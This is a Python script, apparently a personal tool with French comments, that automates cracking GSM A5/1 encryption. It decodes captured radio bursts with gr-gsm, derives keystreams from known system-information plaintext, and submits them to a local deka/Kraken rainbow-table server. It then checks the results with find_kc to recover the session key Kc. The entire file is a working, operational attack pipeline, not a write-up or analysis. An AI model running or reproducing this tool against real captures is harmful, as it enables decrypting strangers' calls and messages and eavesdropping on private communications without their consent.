#!/usr/bin/env python3
# crack_all.py — attaque A5/1 depuis un .cfile, deka-friendly + LOGS detailles.
#
#   .cfile --(grgsm_decode -p, sans cle)--> bursts chiffres
#          --XOR plaintext connu--> keystreams --deka--> etats --find_kc--> Kc
#
# Lots drainés (aucun job orphelin), Ctrl-C propre. Logs: stdout + crack_all.log.
#
# Usage: python3 crack_all.py <cfile|bursts> [--mode TCHF --ts 2 --arfcn 514 --samp 1083333]
#        [--start FN --step 104 --maxblocks 24 --plain si5_sacch,si6_sacch --batch 8]
#        [--secs 320 --log crack_all.log --verbose]

import sys, os, socket, select, time, subprocess, tempfile, signal
from datetime import datetime
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
_HERE=os.path.dirname(os.path.abspath(__file__))
from ciphereds import load, block
from plaintexts import plaintext_bursts

FINDKC='/mnt/kraken/Utilities/find_kc'
HOST,PORT=('127.0.0.1',6666)
def xor(a,b): return ''.join('1' if a[i]!=b[i] else '0' for i in range(114))
def opt(n,d): return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
VERBOSE='--verbose' in sys.argv

_LOGF=None
def log(msg):
    line="[%s] %s"%(datetime.now().strftime('%H:%M:%S'), msg)
    print(line, flush=True)
    if _LOGF:
        _LOGF.write(line+"\n"); _LOGF.flush()

STOP=False
def _sig(*_):
    global STOP; STOP=True
    log("Ctrl-C: on draine le lot en cours puis on sort (pas d'orphelins)...")
signal.signal(signal.SIGINT,_sig)

def extract_bursts(cfile,mode,ts,arfcn,samp,secs):
    out=tempfile.mktemp(suffix='.bursts',dir=_HERE); sp=tempfile.mktemp(suffix='.gsm',dir=_HERE)
    cmd=['grgsm_decode','-m',mode,'-t',str(ts),'-a',str(arfcn),'-s',str(samp),'-c',cfile,'-p','-o',sp]
    log("extraction: "+' '.join(cmd))
    t0=time.time()
    with open(out,'w') as f:
        try: subprocess.run(cmd,stdout=f,stderr=subprocess.DEVNULL,timeout=int(secs))
        except subprocess.TimeoutExpired: pass
    try: os.remove(sp)
    except OSError: pass
    log("extraction finie en %.0fs -> %s"%(time.time()-t0, os.path.basename(out)))
    return out

def drain_batch(sock, lot, lidx):
    """lot = liste de (keystream, count). Soumet, attend TOUS les 'took', retourne Found."""
    myset={ks for ks,cnt in lot}; jobmap={}; founds=[]; buf=b''; ntook=0
    for ks,cnt in lot:
        sock.sendall(("crack %s\n"%ks).encode()); time.sleep(0.02)
        if VERBOSE: log("  soumis count=%s ks=%s..."%(cnt, ks[:24]))
    log("lot %d : %d keystreams soumis, attente des resultats..."%(lidx,len(lot)))
    sock.setblocking(False); t0=time.time()
    while ntook < len(lot):
        if STOP: break
        r,_,_=select.select([sock],[],[],3.0)
        if not r:
            if time.time()-t0>600: log("lot %d : timeout (>600s)"%lidx); break
            continue
        d=sock.recv(32768)
        if not d: raise ConnectionError("deka a ferme la connexion")
        buf+=d
        while b'\n' in buf:
            line,buf=buf.split(b'\n',1); t=line.decode('ascii','ignore').rstrip(); p=t.split()
            if t.startswith('Cracking') and len(p)>=3 and p[2] in myset:
                jobmap[p[1].lstrip('#')]=p[2]
            elif t.startswith('Found') and len(p)>=5:
                ks=jobmap.get(p[4].lstrip('#'))
                if ks: founds.append((p[1],p[3],ks))
            elif 'took' in t and len(p)>=2 and p[1].lstrip('#') in jobmap:
                ntook+=1
                if VERBOSE: log("  %s"%t)
    sock.setblocking(True)
    log("lot %d : %d/%d traites, %d Found"%(lidx,ntook,len(lot),len(founds)))
    return founds

def main():
    global _LOGF
    if len(sys.argv)<2: sys.exit(__doc__)
    src=sys.argv[1]
    logpath=opt('--log', os.path.join(_HERE,'crack_all.log'))
    _LOGF=open(logpath,'a'); log("==== NOUVEAU RUN : %s ===="%src)
    names=opt('--plain','si5_sacch,si6_sacch').split(',')
    batch=int(opt('--batch','8'))
    if src.endswith('.cfile'):
        bpath=extract_bursts(src,opt('--mode','TCHF'),opt('--ts','2'),opt('--arfcn','514'),opt('--samp','1083333'),opt('--secs','320'))
    else: bpath=src
    bursts=load(bpath); fns=sorted(bursts)
    if not fns: sys.exit("aucun burst")
    log("bursts: %d  FN %d -> %d"%(len(bursts),fns[0],fns[-1]))
    step=int(opt('--step','104')); start=int(opt('--start',str(fns[0]))); maxb=int(opt('--maxblocks','24'))
    Pc={n:plaintext_bursts(n) for n in names}
    ks_by_count={}; nb=0; fn=start
    while fn<=fns[-1] and nb<maxb:
        blk=block(bursts,fn)
        if blk:
            nb+=1
            for n in names:
                for i in range(4):
                    c,cb=blk[i]; ks_by_count.setdefault(xor(cb,Pc[n][i]),c)
        fn+=step
    jobs=[(k,c) for k,c in ks_by_count.items()]
    log("plaintexts=%s  blocs=%d  keystreams=%d  lots de %d"%(','.join(names),nb,len(jobs),batch))
    allks=[(c,k) for k,c in jobs]

    total_found=0; t_start=time.time()
    def try_findkc(state,bitpos,cnt):
        dec=str(int(state,16))+'x'; tries=0
        for c2,k2 in allks:
            if c2==cnt: continue
            tries+=1
            out=subprocess.run([FINDKC,dec,str(bitpos),str(cnt),str(c2),k2],capture_output=True,text=True).stdout
            if 'MATCHED' in out:
                for ln in out.splitlines():
                    if 'MATCHED' in ln:
                        log("*** KC TROUVE *** (etat=%s bitpos=%s count=%s verif-count=%s)"%(state,bitpos,cnt,c2))
                        log("   "+ln.strip())
                return True
        if VERBOSE: log("  find_kc: %d trames essayees, aucun match pour etat %s"%(tries,state))
        return False

    sock=socket.socket(); sock.connect((HOST,PORT)); log("connecte a deka %s:%d"%(HOST,PORT))
    try:
        for i in range(0,len(jobs),batch):
            if STOP: log("arret demande."); break
            lot=jobs[i:i+batch]   # liste (keystream,count) — pas de dico (sinon si5/si6 meme count s'ecrasent)
            founds=drain_batch(sock,lot,i//batch)
            total_found+=len(founds)
            for state,bitpos,ks in founds:
                cnt=ks_by_count[ks]
                log("Found etat=%s @ %s count=%s -> verification find_kc..."%(state,bitpos,cnt))
                if try_findkc(state,bitpos,cnt):
                    log("TERMINE en %.0fs, %d Found au total."%(time.time()-t_start,total_found)); return
        log("FINI sans MATCHED : %d Found en %.0fs. (essaie plus de blocs / autre plaintext)"%(total_found,time.time()-t_start))
    finally:
        sock.close(); log("connexion fermee proprement (aucun job orphelin). Log: %s"%logpath)

if __name__=='__main__': main()
